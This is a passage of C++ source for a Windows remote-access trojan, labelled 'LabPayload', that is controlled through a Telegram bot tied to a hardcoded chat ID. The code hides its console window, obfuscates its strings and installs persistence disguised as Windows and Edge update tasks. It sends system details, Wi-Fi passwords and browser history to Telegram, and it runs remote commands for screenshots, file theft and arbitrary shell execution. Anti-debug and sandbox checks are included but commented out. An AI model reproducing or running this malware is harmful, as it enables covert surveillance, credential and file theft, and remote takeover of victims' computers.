        installRegistryRun();
        installStartupFolder();
        installScheduledTask();
    }
    
    void removeAll() {
        std::string key_name = OBFUSCATE("WindowsUpdate_") + 
            std::to_string(GetCurrentProcessId());
        std::string regPath = OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
        RegDeleteKeyValueA(HKEY_CURRENT_USER, regPath.c_str(), key_name.c_str());
        
        char startup_path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
            std::string shortcut_path = std::string(startup_path) + 
                OBFUSCATE("\\SystemUpdate.lnk");
            DeleteFileA(shortcut_path.c_str());
        }
        
        std::string task_name = OBFUSCATE("MicrosoftEdgeUpdateTask_") + 
            std::to_string(GetCurrentProcessId());
        std::string cmd = OBFUSCATE("schtasks /delete /tn \"") + task_name + 
            OBFUSCATE("\" /f");
        system(cmd.c_str());
    }
};

class AntiDebug {
public:
    static bool isDebuggerPresent() {
        if (IsDebuggerPresent()) return true;
        
        typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
            HANDLE, DWORD, PVOID, ULONG, PULONG);
        
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            pNtQueryInformationProcess NtQueryInformationProcess = 
                (pNtQueryInformationProcess)GetProcAddress(hNtdll, 
                    "NtQueryInformationProcess");
            
            if (NtQueryInformationProcess) {
                DWORD debugPort = 0;
                NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(),
                    0x7, &debugPort, sizeof(debugPort), nullptr);
                if (status == 0 && debugPort != 0) return true;
            }
        }
        
        return false;
    }
    
    static bool isSandbox() {
        const char* sandbox_processes[] = {
            "vboxservice.exe", "vboxtray.exe", 
            "vmtoolsd.exe", "vmwaretray.exe",
            "xenservice.exe", "qemu-ga.exe", 
            "sandboxie.exe", "procmon.exe",
            "wireshark.exe", "dumpcap.exe"
        };
        
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = {0};
            pe.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(snapshot, &pe)) {
                do {
                    std::string process_name = pe.szExeFile;
                    for (const auto& sandbox : sandbox_processes) {
                        if (process_name.find(sandbox) != std::string::npos) {
                            CloseHandle(snapshot);
                            return true;
                        }
                    }
                } while (Process32Next(snapshot, &pe));
            }
            CloseHandle(snapshot);
        }
        
        return false;
    }
    
    static void junkCodeLoop() {
        volatile int x = 0;
        for (int i = 0; i < 10000; i++) {
            x += i;
            x ^= x << 2;
            x |= x >> 1;
        }
    }
};

class LabPayload {
private:
    TelegramBotManager bot;
    PersistenceEngine persistence;
    std::string chat_id;
    bool running;
    std::thread command_thread;
    int last_update_id;
    
    void sendInitialInfo() {
        std::string sys_info = SystemInfo::getAllInfo();
        bot.sendMessage(chat_id, sys_info);
        
        std::string wifi_info = WiFiPasswordExtractor::extractAll();
        bot.sendMessage(chat_id, wifi_info);
        
        bot.sendMessage(chat_id, BrowserHistoryExtractor::extractChrome());
        bot.sendMessage(chat_id, BrowserHistoryExtractor::extractFirefox());
        bot.sendMessage(chat_id, BrowserHistoryExtractor::extractEdge());
        
        bot.sendMessage(chat_id, OBFUSCATE("✅ Payload initialized. Type /help for commands."));
    }
    
    void commandListener() {
        while (running) {
            try {
                AntiDebug::junkCodeLoop();
                
                auto [update_ids, messages] = bot.getUpdates();
                
                for (size_t i = 0; i < update_ids.size() && i < messages.size(); i++) {
                    if (update_ids[i] > last_update_id) {
                        last_update_id = update_ids[i];
                        
                        if (!messages[i].empty()) {
                            std::string cmd = messages[i];
                            processCommand(cmd);
                        }
                    }
                }
                
                std::this_thread::sleep_for(std::chrono::seconds(2));
            }
            catch (const std::exception& e) {
                // Ignore errors and continue
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        }
    }
    
    void processCommand(const std::string& cmd) {
        if (cmd == OBFUSCATE("/screenshot") || cmd == OBFUSCATE("/s")) {
            bot.sendMessage(chat_id, OBFUSCATE("📸 Taking screenshot..."));
            takeAndSendScreenshot();
        }
        else if (cmd == OBFUSCATE("/info") || cmd == OBFUSCATE("/i")) {
            bot.sendMessage(chat_id, SystemInfo::getAllInfo());
        }
        else if (cmd == OBFUSCATE("/wifi") || cmd == OBFUSCATE("/w")) {
            bot.sendMessage(chat_id, WiFiPasswordExtractor::extractAll());
        }
        else if (cmd == OBFUSCATE("/history") || cmd == OBFUSCATE("/h")) {
            bot.sendMessage(chat_id, BrowserHistoryExtractor::extractChrome());
            bot.sendMessage(chat_id, BrowserHistoryExtractor::extractFirefox());
            bot.sendMessage(chat_id, BrowserHistoryExtractor::extractEdge());
        }
        else if (cmd.find(OBFUSCATE("/download ")) == 0) {
            std::string filepath = cmd.substr(10);
            downloadAndSendFile(filepath);
        }
        else if (cmd.find(OBFUSCATE("/exec ")) == 0) {
            std::string command = cmd.substr(6);
            executeAndSendResult(command);
        }
        else if (cmd == OBFUSCATE("/persist")) {
            persistence.installAll();
            bot.sendMessage(chat_id, OBFUSCATE("✅ Persistence methods installed"));
        }
        else if (cmd == OBFUSCATE("/remove")) {
            persistence.removeAll();
            bot.sendMessage(chat_id, OBFUSCATE("✅ Persistence methods removed"));
        }
        else if (cmd == OBFUSCATE("/help")) {
            std::string help = 
                OBFUSCATE("📚 **Available Commands**\n\n"
                "/screenshot, /s - Take screenshot\n"
                "/info, /i - System information\n"
                "/wifi, /w - WiFi passwords\n"
                "/history, /h - Browser history\n"
                "/download <path> - Download file\n"
                "/exec <cmd> - Execute command\n"
                "/persist - Install persistence\n"
                "/remove - Remove persistence\n"
                "/exit - Exit payload");
            bot.sendMessage(chat_id, help);
        }
        else if (cmd == OBFUSCATE("/exit")) {
            bot.sendMessage(chat_id, OBFUSCATE("👋 Exiting..."));
            running = false;
            ExitProcess(0);
        }
        else if (!cmd.empty() && cmd[0] == '/') {
            bot.sendMessage(chat_id, OBFUSCATE("❌ Unknown command. Type /help for available commands."));
        }
    }
    
    void takeAndSendScreenshot() {
        std::vector<BYTE> screenshot = ScreenshotCapture::captureToMemory();
        
        if (!screenshot.empty()) {
            if (!bot.sendPhoto(chat_id, screenshot, OBFUSCATE("Screenshot taken at ") + 
                SystemInfo::getCurrentTime())) {
                bot.sendMessage(chat_id, OBFUSCATE("❌ Failed to send screenshot"));
            }
        } else {
            bot.sendMessage(chat_id, OBFUSCATE("❌ Failed to take screenshot"));
        }
    }
    
    void downloadAndSendFile(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        if (file.is_open()) {
            std::vector<BYTE> data((std::istreambuf_iterator<char>(file)),
                std::istreambuf_iterator<char>());
            file.close();
            
            std::string filename = fs::path(path).filename().string();
            if (!bot.sendFile(chat_id, data, filename, OBFUSCATE("📁 File: ") + filename)) {
                bot.sendMessage(chat_id, OBFUSCATE("❌ Failed to send file"));
            }
        } else {
            bot.sendMessage(chat_id, OBFUSCATE("❌ File not found: ") + path);
        }
    }
    
    void executeAndSendResult(const std::string& command) {
        bot.sendMessage(chat_id, OBFUSCATE("⚙️ Executing: `") + command + OBFUSCATE("`"));
        
        FILE* pipe = _popen(command.c_str(), "r");
        if (!pipe) {
            bot.sendMessage(chat_id, OBFUSCATE("❌ Failed to execute command"));
            return;
        }
        
        char buffer[4096];
        std::string result;
        while (fgets(buffer, sizeof(buffer), pipe)) {
            result += buffer;
        }
        _pclose(pipe);
        
        if (result.empty()) {
            result = OBFUSCATE("Command executed successfully (no output)");
        }
        
        if (result.length() > 4000) {
            bot.sendMessage(chat_id, result.substr(0, 4000) + OBFUSCATE("\n... (truncated)"));
        } else {
            bot.sendMessage(chat_id, OBFUSCATE("```\n") + result + OBFUSCATE("\n```"));
        }
    }
    
public:
    LabPayload(const std::string& target_chat_id) : 
        chat_id(target_chat_id), running(false), last_update_id(0) {}
    
    void start() {
        running = true;
        persistence.installAll();
        sendInitialInfo();
        command_thread = std::thread(&LabPayload::commandListener, this);
    }
    
    void stop() {
        running = false;
        if (command_thread.joinable()) {
            command_thread.join();
        }
    }
    
    void wait() {
        if (command_thread.joinable()) {
            command_thread.join();
        }
    }
};

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    // Hide console window
    HWND hWnd = GetConsoleWindow();
    if (hWnd) {
        ShowWindow(hWnd, SW_HIDE);
    }
    
    // Initialize random seed
    srand(static_cast<unsigned int>(time(NULL) ^ GetCurrentProcessId() ^ GetTickCount()));
    
    // Anti-debug checks (commented for lab environment)
    // if (AntiDebug::isDebuggerPresent() || AntiDebug::isSandbox()) {
    //     return 0;
    // }
    
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 0;
    }
    
    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Target chat ID
    std::string chat_id = OBFUSCATE("7369364451");
    
    // Start payload
    LabPayload payload(chat_id);
    payload.start();
    
    // Wait for payload to finish (it won't unless /exit is called)
    payload.wait();
    
    // Cleanup
    Gdiplus::GdiplusShutdown(gdiplusToken);
    WSACleanup();
    
    return 0;
}
